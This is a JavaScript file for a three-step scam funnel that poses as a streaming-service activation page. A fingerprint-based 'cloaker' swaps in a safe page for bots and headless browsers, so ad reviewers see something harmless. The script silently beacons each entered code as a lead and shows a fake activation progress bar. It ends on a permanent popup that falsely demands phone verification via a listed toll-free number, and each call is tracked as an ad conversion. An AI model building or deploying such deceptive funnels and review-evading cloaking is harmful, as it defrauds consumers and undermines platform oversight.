/**
 * Multi-Step Activation Funnel
 * Steps: 1=Enter Code -> 2=Activating -> 3=Code Redeemed (call popup)
 * Reads window.CHANNEL_CONFIG for per-channel branding.
 */
(function () {
    'use strict';

    var cfg = window.CHANNEL_CONFIG || {};
    var service  = cfg.service  || 'Streaming Service';
    var slug     = cfg.slug     || (location.pathname.replace(/^\/+|\.html$/g, '') || 'unknown');
    var logoUrl  = cfg.logoUrl  || '';
    var logoText = cfg.logoText || service;
    var bgColor  = cfg.bgColor  || '#0a0a2e';
    var accent   = cfg.accent   || '#6366f1';
    var btnText  = cfg.btnText  || '#ffffff';

    document.documentElement.style.setProperty('--brand-bg',       bgColor);
    document.documentElement.style.setProperty('--brand-accent',   accent);
    document.documentElement.style.setProperty('--brand-btn-text', btnText);

    /* ── URL params (UTM / gclid) ── */
    function qp(name) {
        try {
            var v = new URLSearchParams(window.location.search).get(name);
            return v ? v.substring(0, 200) : '';
        } catch(e) { return ''; }
    }

    /* ── Fingerprint: full client-side signal set used by the cloaker ── */
    function getFingerprint() {
        var fp = {
            ua:   navigator.userAgent || '',
            sw:   screen && screen.width  || 0,
            sh:   screen && screen.height || 0,
            wd:   !!navigator.webdriver,
            pl:   (navigator.plugins && navigator.plugins.length) || 0,
            tz:   '',
            pg:   location.pathname || '/',
            lang: (navigator.language || '') + '|' + ((navigator.languages || []).join(',')),
            cd:   (screen && screen.colorDepth) || 0,
            hc:   navigator.hardwareConcurrency || 0,
            tm:   navigator.maxTouchPoints || 0
        };
        try { fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch(e) {}
        // Compact hash so the server has a stable per-visitor fingerprint id
        var s = [fp.ua, fp.sw, fp.sh, fp.wd, fp.pl, fp.tz, fp.lang, fp.cd, fp.hc, fp.tm].join('|');
        var h = 0;
        for (var i = 0; i < s.length; i++) { h = ((h<<5)-h) + s.charCodeAt(i); h |= 0; }
        fp.fingerprint = (h>>>0).toString(36);
        return fp;
    }
    var FP = getFingerprint();

    /* ── On-load verification: client-side checks (webdriver / plugins / */
    /*    screen / fingerprint) the server-side first paint cannot do.   */
    /*    Server runs the full 11-check suite via /api/v1/verify; if it  */
    /*    returns block, we replace the page with safe.html.            */
    function verifyAndCloak(onAllow) {
        var payload = {
            channel: slug,
            ua: FP.ua, sw: FP.sw, sh: FP.sh,
            wd: FP.wd, pl: FP.pl, tz: FP.tz, pg: FP.pg,
            fingerprint: FP.fingerprint
        };
        try {
            fetch('/api/v1/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d && d.decision === 'block') {
                    window.location.replace(d.url || '/safe');
                } else if (typeof onAllow === 'function') {
                    onAllow();
                }
            })
            .catch(function () { if (typeof onAllow === 'function') onAllow(); });
        } catch(e) { if (typeof onAllow === 'function') onAllow(); }
    }
    // Fire the verify in parallel with the funnel render — no UX delay,
    // but a determined bot/headless that slipped past the server first paint
    // will be replaced with safe.html within ~200ms.
    verifyAndCloak();

    /* ── Build the 3-step HTML ── */
    document.body.innerHTML = [

        /* STEP 1 — Enter Code */
        '<div class="funnel-step" id="step-code">',
        '  <div class="code-card">',
        '    <img class="code-logo" id="cLogo" src="' + logoUrl + '" alt="' + service + '">',
        '    <div class="code-logo-text" id="cLogoTxt">' + logoText + '</div>',
        '    <div class="code-title">Activate ' + service + '</div>',
        '    <div class="code-sub">Enter the activation code shown on your TV screen to continue.</div>',
        '    <div class="code-input-wrap">',
        '      <input class="code-input" id="codeInput" type="text" maxlength="12" placeholder="e.g. ABC-123456" autocomplete="off" spellcheck="false">',
        '    </div>',
        '    <button class="code-btn" id="codeBtn">Continue &rarr;</button>',
        '    <div class="code-disclaimer">Independent support service &mdash; not affiliated with ' + service + '.</div>',
        '  </div>',
        '</div>',

        /* STEP 2 — Activating / Loading */
        '<div class="funnel-step hidden" id="step-loading">',
        '  <div class="loading-inner">',
        '    <img class="loading-logo" id="lLogo" src="' + logoUrl + '" alt="' + service + '">',
        '    <div class="loading-logo-text" id="lLogoTxt">' + logoText + '</div>',
        '    <div class="loading-msg">Activating your ' + service + ' subscription&hellip;</div>',
        '    <div class="progress-track"><div class="progress-bar" id="progBar"></div></div>',
        '    <div class="loading-dots"><span></span><span></span><span></span></div>',
        '  </div>',
        '</div>',

        /* STEP 3 — Code Redeemed (permanent popup) */
        '<div class="funnel-step hidden" id="step-call">',
        '  <div class="redeem-overlay">',
        '    <div class="redeem-modal">',
        '      <div class="redeem-check">',
        '        <svg viewBox="0 0 52 52" width="48" height="48" fill="none" stroke="#16a34a" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">',
        '          <circle cx="26" cy="26" r="22" stroke="#bbf7d0"></circle>',
        '          <path d="M16 27 l8 8 l14 -16"></path>',
        '        </svg>',
        '      </div>',
        '      <div class="redeem-title">Code Redeemed Successfully</div>',
        '      <div class="redeem-sub">Phone verification is required to complete your activation. Call the number below to finish.</div>',
        '      <div class="redeem-number">+1 888 779 1904</div>',
        '      <a class="redeem-btn" href="tel:+18887791904" id="callBtn">',
        '        <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">',
        '          <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>',
        '        </svg>',
        '        Call to Verify',
        '      </a>',
        '      <div class="redeem-avail"><span class="live-dot"></span>Available 24/7 &mdash; Real People, Real Help</div>',
        '    </div>',
        '  </div>',
        '</div>',

    ].join('\n');

    /* ── Logo fallback (both visible logos) ── */
    function logoFallback(imgId, txtId) {
        var img = document.getElementById(imgId);
        var txt = document.getElementById(txtId);
        if (!img || !txt) return;
        if (!logoUrl) {
            img.style.display = 'none';
            txt.style.display = 'block';
        } else {
            img.onerror = function () {
                img.style.display = 'none';
                txt.style.display = 'block';
            };
        }
    }
    logoFallback('cLogo', 'cLogoTxt');
    logoFallback('lLogo', 'lLogoTxt');

    /* ── Step helpers ── */
    function show(id) { var el = document.getElementById(id); if (el) el.classList.remove('hidden'); }
    function hide(id) { var el = document.getElementById(id); if (el) el.classList.add('hidden'); }

    /* ── Silent code-submit POST ── */
    function reportCodeSubmit(code) {
        try {
            var payload = {
                channel:  slug,
                code:     code,
                screen:   FP.sw + 'x' + FP.sh,
                tz:       FP.tz,
                fingerprint: FP.fingerprint,
                plugins:  FP.pl,
                wd:       FP.wd,
                lang:     FP.lang,
                referrer: document.referrer || '',
                utm_source:   qp('utm_source'),
                utm_campaign: qp('utm_campaign'),
                utm_medium:   qp('utm_medium'),
                utm_content:  qp('utm_content'),
                utm_term:     qp('utm_term'),
                gclid:        qp('gclid')
            };
            var url = '/api/v1/code-submit';
            if (navigator.sendBeacon) {
                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                navigator.sendBeacon(url, blob);
            } else {
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(function(){});
            }
        } catch(e) {}
    }

    /* ── Silent call-click POST ── */
    function reportCallClick() {
        try {
            var payload = {
                channel:     slug,
                fingerprint: FP.fingerprint,
                screen:      FP.sw + 'x' + FP.sh,
                tz:          FP.tz,
                plugins:     FP.pl,
                wd:          FP.wd
            };
            var url = '/api/v1/call-click';
            if (navigator.sendBeacon) {
                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                navigator.sendBeacon(url, blob);
            } else {
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(function(){});
            }
        } catch(e) {}
    }

    /* ── Step 1 -> Step 2 ── */
    document.getElementById('codeBtn').addEventListener('click', goToLoading);
    document.getElementById('codeInput').addEventListener('keydown', function (e) {
        if (e.key === 'Enter') goToLoading();
    });

    function goToLoading() {
        var raw = document.getElementById('codeInput').value || '';
        var code = raw.replace(/[^A-Za-z0-9-]/g, '').toUpperCase().substring(0, 20);
        /* Capture the lead BEFORE advancing */
        reportCodeSubmit(code);

        hide('step-code');
        show('step-loading');

        requestAnimationFrame(function () {
            requestAnimationFrame(function () {
                var bar = document.getElementById('progBar');
                if (bar) bar.style.width = '100%';
            });
        });

        setTimeout(goToCall, 3200);
    }

    /* ── Step 2 -> Step 3 (permanent popup) ── */
    function goToCall() {
        hide('step-loading');
        show('step-call');
        document.body.style.overflow = 'hidden';
    }

    /* ── Call button: track + Google Ads conversion + dial ── */
    document.getElementById('callBtn').addEventListener('click', function (e) {
        e.preventDefault();
        var url = this.href;
        var dialed = false;
        var dial = function () {
            if (!dialed) { dialed = true; window.location = url; }
        };

        reportCallClick();

        /* Safety fallback — dial even if gtag callback never fires */
        setTimeout(dial, 1000);

        if (typeof gtag === 'function') {
            gtag('event', 'conversion', {
                'send_to': 'AW-11546748562/0VO9CImIrfsbEJLN9YEr',
                'value': 1.0,
                'currency': 'INR',
                'event_callback': dial
            });
        } else {
            dial();
        }
    });

})();
